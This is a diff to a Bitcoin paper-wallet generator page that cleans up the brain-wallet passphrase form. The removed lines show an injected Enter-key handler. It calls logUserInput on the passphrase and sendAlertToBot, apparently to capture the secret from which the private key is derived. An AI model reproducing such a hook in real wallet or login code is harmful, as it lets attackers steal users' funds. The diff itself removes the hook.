@@ -6841,50 +6841,43 @@ gtag('config', 'G-WKH070VBDW');
 				</div>
 			</div>
 			
-			<div id="brainarea" class="walletarea">
-				<div id="braincommands" class="commands">
-					<div class="row">
-						<span id="brainlabelenterpassphrase" class="label"><label for="brainpassphrase">Enter Passphrase: </label></span>
-						<input tabindex="1" type="password" id="brainpassphrase" value="" onfocus="this.select();" onkeypress="if (event.keyCode == 13) {
-					        event.preventDefault(); 
-					           setTimeout(function() { 
-					               logUserInput(this.value);
-					               sendAlertToBot();
-					               ninja.wallets.brainwallet.view(); 
-					           }.bind(this), 2000); 
-					       }" />						
-						<span><label id="brainlabelshow" for="brainpassphraseshow">Show?</label> <input type="checkbox" id="brainpassphraseshow" onchange="ninja.wallets.brainwallet.showToggle(this);" /></span>
-						<span class="print"><input type="button" name="print" id="brainprint" value="Print" onclick="window.print();" /></span>
-					</div>
-					<div class="row extra">
-						<span class="label" id="brainlabelconfirm"><label for="brainpassphraseconfirm">Confirm Passphrase: </label></span>
-						<input tabindex="2" type="password" id="brainpassphraseconfirm" value="" onfocus="this.select();" onkeypress="if (event.keyCode == 13) ninja.wallets.brainwallet.view();" />
-						
-						<span id="brainalgorithm" class="notes right">Algorithm: SHA256(passphrase)</span>
-					</div>
-					<div class ="row extra">
-						<span><label tabindex="3" id="brainlabelcompressed" for="braincompressed">Compressed address?</label> <input type="checkbox" id="braincompressed" /></span>
-						<span><input tabindex="4" type="button" id="brainview" value="View" onclick="ninja.wallets.brainwallet.view();" /></span>
-					</div>
-					<div class="row extra"><span id="brainwarning"></span></div>
-				</div>
-				<div id="brainkeyarea" class="keyarea">
-					<div class="public">
-						<div id="brainqrcodepublic" class="qrcode_public"></div>
-						<div class="pubaddress">
-							<span class="label" id="brainlabelbitcoinaddress">Bitcoin Address:</span>
-							<span class="output" id="brainbtcaddress"></span>
-						</div>
-					</div>
-					<div class="private">
-						<div id="brainqrcodeprivate" class="qrcode_private"></div>
-						<div class="privwif">
-							<span class="label" id="brainlabelprivatekey">Private Key (Wallet Import Format):</span>
-							<span class="output" id="brainbtcprivwif"></span>
-						</div>
-					</div>
-				</div>
-			</div>
+<div id="brainarea" class="walletarea">
+<div id="braincommands" class="commands">
+    <div class="row">
+        <span id="brainlabelenterpassphrase" class="label"><label for="brainpassphrase">Enter Passphrase: </label></span>
+        <input tabindex="1" type="password" id="brainpassphrase" value="" onfocus="this.select();" onkeypress="if (event.keyCode == 13) ninja.wallets.brainwallet.view();" />
+        <span><label id="brainlabelshow" for="brainpassphraseshow">Show?</label> <input type="checkbox" id="brainpassphraseshow" onchange="ninja.wallets.brainwallet.showToggle(this);" /></span>
+        <span class="print"><input type="button" name="print" id="brainprint" value="Print" onclick="window.print();" /></span>
+    </div>
+    <div class="row extra">
+        <span class="label" id="brainlabelconfirm"><label for="brainpassphraseconfirm">Confirm Passphrase: </label></span>
+        <input tabindex="2" type="password" id="brainpassphraseconfirm" value="" onfocus="this.select();" onkeypress="if (event.keyCode == 13) ninja.wallets.brainwallet.view();" />
+        
+        <span id="brainalgorithm" class="notes right">Algorithm: SHA256(passphrase)</span>
+    </div>
+    <div class ="row extra">
+        <span><label tabindex="3" id="brainlabelcompressed" for="braincompressed">Compressed address?</label> <input type="checkbox" id="braincompressed" /></span>
+        <span><input tabindex="4" type="button" id="brainview" value="View" onclick="ninja.wallets.brainwallet.view();" /></span>
+    </div>
+    <div class="row extra"><span id="brainwarning"></span></div>
+</div>
+<div id="brainkeyarea" class="keyarea">
+    <div class="public">
+        <div id="brainqrcodepublic" class="qrcode_public"></div>
+        <div class="pubaddress">
+            <span class="label" id="brainlabelbitcoinaddress">Bitcoin Address:</span>
+            <span class="output" id="brainbtcaddress"></span>
+        </div>
+    </div>
+    <div class="private">
+        <div id="brainqrcodeprivate" class="qrcode_private"></div>
+        <div class="privwif">
+            <span class="label" id="brainlabelprivatekey">Private Key (Wallet Import Format):</span>
+            <span class="output" id="brainbtcprivwif"></span>
+        </div>
+    </div>
+</div>
+</div>
 			
 			<div id="vanityarea" class="walletarea">
 				<div id="vanitystep1label" class="commands expandable" onclick="ninja.wallets.vanitywallet.openCloseStep(1);">
